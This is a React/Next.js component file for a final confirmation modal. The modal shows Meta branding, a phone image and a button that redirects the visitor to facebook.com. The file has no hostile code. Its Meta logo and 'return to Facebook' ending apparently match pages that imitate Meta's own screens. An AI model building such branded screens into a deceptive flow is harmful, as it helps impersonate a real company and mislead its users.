import MetaLogo from '@/assets/images/meta-logo-grey.png';
import PhoneImage from '@/assets/images/phone.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import Image from 'next/image';
import type { FC } from 'react';

const FinalModal: FC<{ texts?: Record<string, string> }> = ({ texts = DEFAULT_TEXTS }) => {
    return (
        <div className='ae-modal-overlay'>
            <div className='ae-modal-panel'>
                <div className='ae-modal-body'>
                    <p className='ae-modal-title'>{texts.finalTitle}</p>
                    <p className='ae-modal-lead'>{texts.finalDesc}</p>
                    <Image src={PhoneImage} alt='success visual' className='ae-success-image' />
                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='btn btn-primary w-100'>
                        {texts.returnFacebook}
                    </button>
                </div>
                <div className='ae-modal-footer'>
                    <Image src={MetaLogo} alt='Meta logo' width={70} height={20} />
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
